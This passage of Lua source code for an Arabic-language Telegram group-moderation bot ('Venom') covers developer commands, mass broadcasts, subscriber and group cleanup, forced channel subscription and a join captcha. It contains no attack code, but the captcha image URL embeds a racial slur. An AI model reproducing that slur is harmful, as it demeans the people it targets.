https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "توكن البوت" and SudoBot(msg) or text == 'جلب التوكن' and SudoBot(msg) then 
if not Devban(msg) then
send(msg.chat_id_, msg.id_,'هذا الامر خاص بمطور البوت')
return false
end
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
send(msg.chat_id_, msg.id_,' ') 
end
if text == 'باندا مبرمج السورس' and Devban(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
「المبرمج باندا لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓」
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹ʙᴀɴᴅᴀ➧ᴏғғʟɪɴᴇ˼', url="t.me/Q_0_ll"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قناه السورس' and Devban(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 𖥔 من أحسن السورسات على التليجرام سورس فينوم 𖥔
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
خش على تواصل هيدخلك لروم التواصل 
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "ضع اسم للبوت" and Devban(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل اليه الاسم الان ")
return false
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:ban:2")
t = "\n 𖥔 قائمة مطورين الثانويين للبوت \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end


if text == 'الاحصائيات' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' 𖥔 الاحصائيات  \n'..' 𖥔 عدد الجروبات  ↚ {'..Groups..'}'..'\n 𖥔  عدد المشتركين  ↚ {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'المشتركين' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 𖥔 المشتركين ↚{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'الجروبات ' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 𖥔 الجروبات ↚{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("المطورين") and SudoBot(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n 𖥔 قائمة المطورين \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("قائمه العام") and SudoBot(msg) then
local list = database:smembers(bot_id..'GVNO:User')
t = "\n 𖥔 قائمه المحظورين عام \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("قائمه الكتم العام") and SudoBot(msg) then
local list = database:smembers(bot_id..'Gmute:User')
t = "\n 𖥔 قائمة المكتومين عام \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص " and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل الان اذاعتك؟ \n 𖥔 للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه " and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل الان اذاعتك؟ \n 𖥔 للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص " and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل لي التوجيه الان")
return false
end 
if text == 'جلب النسخه' and Devban(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين " and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 𖥔 •\n• لايمكنك استخدام البوت 𖥔 •\n• عليك الاشتراك في القناة 𖥔 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' 𖥔 لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' 𖥔 عدد المشتركين الان  ↚ ( '..#pv..' )\n 𖥔 تم ازالة  ↚ ( '..sendok..' ) من المشتركين\n 𖥔  الان عدد المشتركين الحقيقي  ↚ ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الجروبات " and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 𖥔 •\n• لايمكنك استخدام البوت 𖥔 •\n• عليك الاشتراك في القناة 𖥔 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' 𖥔 لا يوجد جروبات وهميه في البوت\n')   
else
local VENOM = (w + q)
local sendok = #group - VENOM
if q == 0 then
VENOM = ''
else
VENOM = '\n 𖥔 تم ازالة  ↚ 「 '..q..' 」 جروبات من البوت'
end
if w == 0 then
VENOMk = ''
else
VENOMk = '\n 𖥔 تم ازالة  ↚ 「 '..w..' 」 كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' 𖥔  عدد الجروبات الان  ↚ 「 '..#group..' 」'..VENOMk..''..VENOM..'\n 𖥔  الان عدد الجروبات الحقيقي  ↚ 「 '..sendok..' 」 جروبات\n')   
end
end
end,nil)
end
return false
end


if text and text:match("^رفع مطور @(.*)$") and Devban(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مطور'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and Devban(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and Devban(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المطورين'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and Devban(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
--------------------------------------------------------------------------------------------------------------
if text and not Special(msg) then  
local VENOM1_Msg = database:get(bot_id.."VENOM1:Add:Filter:Rp2"..text..msg.chat_id_)   
if VENOM1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔 الـعـضو   ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 '..VENOM1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ' then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " 𖥔 تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء 𖥔' then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء الاذاعه للخاص")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," 𖥔 تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء 𖥔' then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء الاذاعه")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," 𖥔 تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء 𖥔' then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," 𖥔 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء 𖥔' then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," 𖥔 تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " 𖥔 تم الغاء الامر ")
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, ' 𖥔 المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' 𖥔 عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' 𖥔 عذا لا يمكنك وضع معرف كروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' 𖥔 البوت ادمن في القناة \n 𖥔 تم تفعيل الاشتراك الاجباري في \n 𖥔 ايدي القناة ('..data.id_..')\n 𖥔 معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' 𖥔 عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " 𖥔 تم الغاء الامر ")
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,' 𖥔 تم تغيير رسالة الاشتراك ')
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n• نورت حبي \n•  name \n• user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end 
if database:get(bot_id.."CAPTCHA"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then 
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
captcha = math.random(4567,8907);
cap = math.random(10,50);
capt = math.random(60,90);
capc = math.random(100,500);
local Text ='• قم بختيار الرقم الصحيح الموجود في الصوره\n• ليتم الغاء تقييدك الان'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '9'..capt..'5', callback_data=capt..msg.sender_user_id_},{text =capc..'2', callback_data=capc..msg.sender_user_id_}},
{{text = '4'..cap..'8', callback_data=cap},{text = captcha, callback_data='okCaptcha'..msg.sender_user_id_}},
{{text = '1'..capt..'2', callback_data=capt},{text = '7'..capc, callback_data=capc}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://mode-pro.tk/niggax/captcha.php?c='..captcha..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if database:get(bot_id.."CAPTCHA"..msg.chat_id_) then
if msg.content_.ID == "MessageChatAddMembers" then 
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
captcha = math.random(4567,8907);
cap = math.random(10,50);
capt = math.random(60,90);
capc = math.random(100,500);
local Text ='• قم بختيار الرقم الصحيح الموجود في الصوره\n• ليتم الغاء تقييدك الان'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '9'..capt..'5', callback_data=capt..msg.sender_user_id_},{text =capc..'2', callback_data=capc..msg.sender_user_id_}},
{{text = '4'..cap..'8', callback_data=cap},{text = captcha, callback_data='okCaptcha'..msg.sender_user_id_}},
{{text = '1'..capt..'2', callback_data=capt},{text = '7'..capc, callback_data=capc}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://mode-pro.tk/niggax/captcha.php?c='..captcha..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if msg.content_.ID == "MessageChatAddMembers" then 
if msg.content_.members_[0].id_ == tonumber(bot_id) then 
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "فينوم")
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = bot_id,offset_ = 0,limit_ = 1},function(extra,result,success) 
if result.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔 مــطــور الــبــوت 𖥔', url="http://t.me/"..sudos.UserName},
},
{
{text = '𖥔 اضفني الي مجموعتك 𖥔', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
local Texti = "🤖╖ أهلآ بك عزيزي أنا بوت  "..N.." 🌐╢ وظيفتي حماية المجموعات\n✅╢ لتفعيل البوت عليك اتباع مايلي \n🔘╢ أضِف البوت إلى مجموعتك\n⚡️╢ ارفعهُ » مشرف\n⬆️╜ سيتم ترقيتك مالك في البوت"
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Texti)..'&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)
end,nil)
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,' 𖥔 عذرآ البوت ليس ادمن بالقناه ')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,' 𖥔 … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' 𖥔 تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' 𖥔 تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' 𖥔 تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," 𖥔 تم الغاء حفظ الرابط")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
